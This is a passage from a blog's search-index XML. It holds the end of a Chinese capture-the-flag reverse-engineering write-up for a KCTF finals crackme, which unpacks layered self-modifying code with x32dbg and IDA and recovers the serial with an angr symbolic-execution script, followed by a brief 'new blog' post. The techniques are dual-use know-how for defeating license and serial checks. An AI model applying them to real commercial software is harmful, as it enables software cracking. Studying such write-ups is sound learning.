&quot;over&quot;</code></pre><p>通过比对进入smc时的特征，使用x32dbg脚本，跑完发现有1403层smc，用脚本跑到最后一层，发现下面的代码是完整的函数，代码很长，还有很多重定位和混淆，故先全部提取到code文件并修正一下esi。</p><p>用IDA分析code文件，先修改基址为0x1A1857E，F5代码如下。</p><p><img src="kctf-%E6%80%BB%E5%86%B3%E8%B5%9B%E7%AC%AC%E5%9B%9B%E9%A2%98.assets/image-20200111014720242.png" alt="image-20200111014720242"></p><p>代码比较清晰了，serial经过计算，跟用户名比较，如果相同则成功。</p><p>注意KCTF用户名不足16位，后面的填充数据也是要比较的。也就是说实际上比较的是</p><blockquote><p>4B 43 54 46 00 1A 19 18 17 16 15 14 13 12 11 10 00</p></blockquote><p>因为代码还是有点看不太懂的，所以提取反编译以后的代码，放到VS中重新编译成exe以后使用angr跑出来flag。  angr 的python代码如下</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding=utf-8</span><span class="token keyword">import</span> angr<span class="token keyword">import</span> claripy<span class="token keyword">import</span> base64<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    load_option <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    b <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">"./ConsoleApplication21.exe"</span><span class="token punctuation">,</span> load_options<span class="token operator">=</span>load_option<span class="token punctuation">)</span>    state <span class="token operator">=</span> b<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x401040</span><span class="token punctuation">)</span>    concrete_addr <span class="token operator">=</span> <span class="token number">0x404378</span>    flag_chars <span class="token operator">=</span> <span class="token punctuation">[</span>claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'flag_%d'</span> <span class="token operator">%</span> i<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    flag <span class="token operator">=</span> claripy<span class="token punctuation">.</span>Concat<span class="token punctuation">(</span><span class="token operator">*</span>flag_chars<span class="token punctuation">)</span>    state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>concrete_addr<span class="token punctuation">,</span> flag<span class="token punctuation">)</span>    sm <span class="token operator">=</span> b<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>state<span class="token punctuation">)</span>    <span class="token keyword">print</span> sm<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span><span class="token number">0x4013A3</span><span class="token punctuation">)</span>    found <span class="token operator">=</span> sm<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    temp <span class="token operator">=</span> <span class="token punctuation">(</span>found<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> temp    solution <span class="token operator">=</span> found<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>eval<span class="token punctuation">(</span>flag<span class="token punctuation">,</span> cast_to<span class="token operator">=</span>str<span class="token punctuation">)</span>    s <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> solution<span class="token punctuation">:</span>        s<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> s    <span class="token keyword">print</span> solution<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"hex"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution<span class="token punctuation">)</span>    <span class="token keyword">print</span> flag<span class="token punctuation">,</span> found<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后成功跑出结果。</p><p><img src="kctf-%E6%80%BB%E5%86%B3%E8%B5%9B%E7%AC%AC%E5%9B%9B%E9%A2%98.assets/image-20200111014829398.png" alt="image-20200111014829398"></p>]]></content>
      
      
      <categories>
          
          <category> writeup </category>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> 看雪CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hookme</title>
      <link href="/2019/12/26/hookme/"/>
      <url>/2019/12/26/hookme/</url>
      
        <content type="html"><![CDATA[<h1 id="新的博客开始啦"><a href="#新的博客开始啦" class="headerlink" title="新的博客开始啦~"></a>新的博客开始啦~</h1><p>认真整理东西！！！ 冲！</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
